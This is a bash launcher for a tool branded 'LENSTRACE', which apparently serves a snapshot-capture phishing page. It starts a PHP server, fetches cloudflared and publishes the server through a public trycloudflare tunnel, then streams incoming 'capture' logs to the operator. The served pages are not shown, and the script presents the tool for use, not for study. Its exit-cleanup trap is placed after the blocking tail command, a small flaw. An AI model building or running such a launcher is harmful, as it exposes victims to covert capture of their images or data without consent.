#!/usr/bin/env bash

# ============================================================
#  LENSTRACE - Automated Snapshot Telemetry Console
#  by CHRIZ • SKY TECH&CRAFTS
# ============================================================

clear

# ------------------ Branding (PRESERVED) --------------------
echo -e "\e[35m"
cat << "EOF"
██╗     ███████╗███╗   ██╗███████╗████████╗██████╗  █████╗  ██████╗███████╗
██║     ██╔════╝████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██║     █████╗  ██╔██╗ ██║███████╗   ██║   ██████╔╝███████║██║     █████╗  
██║     ██╔══╝  ██║╚██╗██║╚════██║   ██║   ██╔══██╗██╔══██║██║     ██╔══╝  
███████╗███████╗██║ ╚████║███████║   ██║   ██║  ██║██║  ██║╚██████╗███████╗
╚══════╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
EOF
echo -e "\e[0m"

echo -e "\e[35mLENSTRACE\e[0m"
echo "Automated Snapshot Telemetry Console"
echo "by CHRIZ • SKY TECH&CRAFTS"
echo "--------------------------------------------------"

# ------------------ Core Config -----------------------------
HOST="127.0.0.1"
PORT="8080"
CLOUDFLARED="./cloudflared"
TUNNEL_LOG="tunnel_silent.log"

# ------------------ Session Init ----------------------------
SESSION_ID=$(date +"%Y%m%d_%H%M%S")
mkdir -p capture

# (Optional) write a separator without polluting live view
echo "===== NEW LENSTRACE SESSION [$SESSION_ID] =====" >> capture/session.log

# ------------------ PHP Server ------------------------------
echo "[✓] Starting PHP server on $HOST:$PORT ..."
php -S "$HOST:$PORT" > /dev/null 2>&1 &
PHP_PID=$!
sleep 1

# ------------------ Architecture Detection ------------------
ARCH=$(uname -m)
case "$ARCH" in
  aarch64|arm64) CF_ARCH="arm64" ;;
  x86_64|amd64)  CF_ARCH="amd64" ;;
  *)
    echo "[!] Unsupported CPU architecture: $ARCH"
    kill $PHP_PID 2>/dev/null
    exit 1
    ;;
esac
echo "[✓] Detected architecture: $ARCH"

# ------------------ Cloudflared Setup -----------------------
CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-$CF_ARCH"

if [ ! -f "$CLOUDFLARED" ]; then
  echo "[*] Downloading cloudflared ($CF_ARCH)..."
  curl -L "$CF_URL" -o cloudflared || {
    echo "[!] Failed to download cloudflared"
    kill $PHP_PID 2>/dev/null
    exit 1
  }
  chmod +x cloudflared
fi

"$CLOUDFLARED" --version >/dev/null 2>&1 || {
  echo "[!] cloudflared binary incompatible with this system"
  kill $PHP_PID 2>/dev/null
  exit 1
}
echo "[✓] Cloudflared binary ready"

# ------------------ Tunnel Startup --------------------------
echo "[*] Establishing Cloudflare Tunnel..."
nohup "$CLOUDFLARED" tunnel \
  --url "http://$HOST:$PORT" \
  --no-autoupdate \
  > "$TUNNEL_LOG" 2>&1 &

# ------------------ Resolve Public URL ----------------------
echo "[*] Resolving public tunnel URL..."
PUBLIC_URL=""
for i in {1..20}; do
  PUBLIC_URL=$(grep -oE "https://[a-zA-Z0-9.-]+\.trycloudflare\.com" "$TUNNEL_LOG" | head -n1)
  [ -n "$PUBLIC_URL" ] && break
  sleep 1
done

if [ -z "$PUBLIC_URL" ]; then
  echo "[!] Tunnel started but public URL not detected yet"
  echo "[!] Check manually: $TUNNEL_LOG"
  kill $PHP_PID 2>/dev/null
  exit 1
fi

echo "[✓] Tunnel established"
echo -e "🌐 Public URL: \e[36m$PUBLIC_URL\e[0m"
echo "--------------------------------------------------"
echo "📡 LIVE CAPTURE MONITOR"
echo "Press Ctrl+C to stop"

# ------------------ CLEAN Live Capture ----------------------
# KEY FIX:
#  -n 0  => do NOT print old logs
#  -F    => follow safely even if files rotate/recreate
tail -n 0 -F capture/*.log 2>/dev/null

# ------------------ Cleanup on Exit -------------------------
trap 'echo; echo "[*] Shutting down..."; kill $PHP_PID 2>/dev/null; exit' INT TERM
